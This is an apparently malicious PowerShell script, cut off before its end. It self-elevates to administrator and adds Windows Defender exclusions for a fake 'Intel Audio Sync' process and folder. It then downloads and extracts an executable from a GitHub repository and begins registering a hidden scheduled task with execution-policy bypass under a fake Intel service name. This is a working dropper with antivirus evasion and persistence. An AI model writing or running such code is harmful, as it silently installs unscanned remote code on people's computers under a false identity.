# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
  if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
        $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
        Start-Process powershell -Verb runas -ArgumentList $CommandLine
        Exit
  }
}

$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Sync"
$TargetFile = "$TargetPath\Intel Audio Sync.exe"
$TargetZip = "$TargetPath\Intel Audio Sync.zip"
$TargetLog = "$TargetPath\Intel Audio Sync.log"

if (Test-Path "$TargetFile") {
  Remove-Item -Force -Path "$TargetFile"
  Write-Output "Project file removed"
}

if (Test-Path "$TargetZip") {
  Remove-Item -Force -Path "$TargetZip"
  Write-Output "Project zip removed"
}

Add-MpPreference -ExclusionProcess 'Intel Audio Sync' -Force
Add-MpPreference -ExclusionProcess 'Intel Audio Sync.exe' -Force
Add-MpPreference -ExclusionPath "$TargetPath" -Force
Add-MpPreference -ExclusionPath "$TargetFile" -Force
Write-Output "Exclusions added"

if (-Not (Test-Path "$TargetFile")) {
  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/x64/Release/Intel%20Audio%20Sync.zip" -OutFile "$TargetZip"
  Write-Output "File downloaded"
  Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
  Write-Output "File extracted"
  Remove-Item -Path "$TargetZip"
  Write-Output "Zip file removed"
}

$TaskDescription = "Running Intel(R) Dynamic Management Audio Sync Service from Task Scheduler"
$TaskCommand = "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe"
$TaskScript = "$TargetFolder\ias.ps1"
$TaskArg = "-WindowStyle Hidden -NonInteractive -Executionpolicy bypass -file $TaskScript"
$TaskStartTime = [datetime]::Now.AddMinutes(1)
$service = new-object -ComObject("Schedule.Service")
$service.Connect()
$TaskName = "Intel(R) Dynamic Management Audio Sync Service"
$rootFolder = $service.GetFolder("\Intel\Audio")
$TaskDefinition = $service.NewTask(0)
$TaskDefinition.RegistrationInfo.Description = "$TaskDescription"
$TaskDefinition.Settings.Enabled = $true
$TaskDefinition.Settings.AllowDemandStart = $true
$triggers = $TaskDefinition.Triggers
$trigger = $triggers.Create(8)